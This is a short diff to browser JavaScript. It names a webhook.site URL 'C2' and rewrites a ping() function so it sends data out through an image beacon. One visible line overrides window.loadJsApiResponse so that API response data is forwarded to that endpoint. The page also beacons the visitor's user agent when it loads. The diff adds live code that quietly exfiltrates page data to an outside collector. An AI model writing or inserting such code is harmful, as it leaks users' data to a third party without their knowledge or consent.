@@ -16,14 +16,10 @@ window.loadJsApiResponse  = function(id, data){ ping("api_resp3", {id, data}); }
 const C2 = "https://webhook.site/e4a2208e-d55c-49fb-8566-5c124da0a6a4"
 
 function ping(tag, data) {
-    const payload = encodeURIComponent(JSON.stringify(data ?? "ok"));
-    
-    // method 1 - fetch (works fine, CORS header on server handles it)
-    fetch(C2 + "/collect?t=" + tag + "&d=" + payload)
-        .catch(function() {
-            // method 2 - img beacon fallback
-            new Image().src = C2 + "/collect?t=" + tag + "&d=" + payload;
-        });
+    new Image().src = C2 
+        + "?t=" + encodeURIComponent(tag)
+        + "&d=" + encodeURIComponent(JSON.stringify(data ?? "ok"))
+        + "&ts=" + Date.now();
 }
 
 ping("page_loaded", { ua: navigator.userAgent, ts: Date.now() });
